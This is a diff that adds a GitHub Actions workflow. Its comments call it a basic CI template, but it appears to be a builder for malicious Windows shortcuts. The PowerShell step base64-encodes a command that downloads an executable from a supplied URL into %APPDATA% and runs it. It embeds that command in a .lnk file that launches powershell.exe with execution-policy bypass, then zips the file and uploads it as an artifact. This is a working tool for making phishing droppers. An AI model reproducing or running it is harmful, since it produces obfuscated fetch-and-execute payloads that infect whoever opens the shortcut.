@@ -1,0 +1,60 @@
+# This is a basic workflow to help you get started with Actions
+
+name: CI
+
+# Controls when the workflow will run
+on:
+  # Allows you to run this workflow manually from the Actions tab
+  workflow_dispatch:
+    inputs:
+      download_url:
+        description: "URL to download exe from"
+        type: string
+        required: true
+      output_path:
+        description: "Place to save the file"
+        type: string
+        required: true
+      link_name:
+        description: "LNK file name"
+        type: string
+        required: true
+
+# A workflow run is made up of one or more jobs that can run sequentially or in parallel
+jobs:
+  # This workflow contains a single job called "build"
+  build:
+    # The type of runner that the job will run on
+    runs-on: windows-latest
+
+    # Steps represent a sequence of tasks that will be executed as part of the job
+    steps:
+      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
+      - uses: actions/checkout@v3
+
+      - name: Run powershell
+        shell: pwsh
+        run: |
+          $COMMAND="Invoke-WebRequest -URI ${{ inputs.download_url }} -OutFile $env:APPDATA\${{ inputs.output_path }}; .$env:APPDATA\${{ inputs.output_path }}"
+          $Bytes = [System.Text.Encoding]::Unicode.GetBytes($COMMAND)
+          $EncodedText =[Convert]::ToBase64String($Bytes)
+
+          $WshShell = New-Object -ComObject WScript.Shell
+          $Shortcut = $WshShell.CreateShortcut("$Home\${{ inputs.link_name }}.lnk")
+          $Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+          $Shortcut.Arguments = "-noprofile -executionpolicy bypass -EncodedCommand $EncodedText"
+          $Shortcut.Save()
+
+          $compress = @{
+          Path = "$Home\${{ inputs.link_name }}.lnk"
+          CompressionLevel = "Fastest"
+          DestinationPath = "$Home\${{ inputs.link_name }}.zip"
+          }
+          Compress-Archive @compress
+
+          ls $Home\${{ inputs.link_name }}.zip
+          
+      - uses: actions/upload-artifact@v3
+        with:
+          name: zipped_lnk
+          path: C:\Users\runneradmin\${{ inputs.link_name }}.zip
